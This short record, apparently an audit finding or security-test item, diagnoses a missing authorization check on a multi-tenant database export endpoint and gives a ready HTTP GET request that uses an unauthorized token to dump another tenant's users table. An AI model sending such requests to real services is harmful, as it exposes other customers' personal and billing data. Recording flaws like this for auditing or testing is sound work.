diagnosis: The database export endpoint selects the tenant's isolated pg-pool connection using tenantId directly from the query parameter without checking whether the caller is an administrator of tenantId. Any user can export complete customer and billing tables from other tenants' dedicated PostgreSQL databases.
exploit_request:
GET /api/database/export-dump?tenantId=9018&tableName=users HTTP/1.1
Host: backups.cloud.internal:9103
Authorization: Bearer <unauthorized_tenant_token>
Accept: application/json
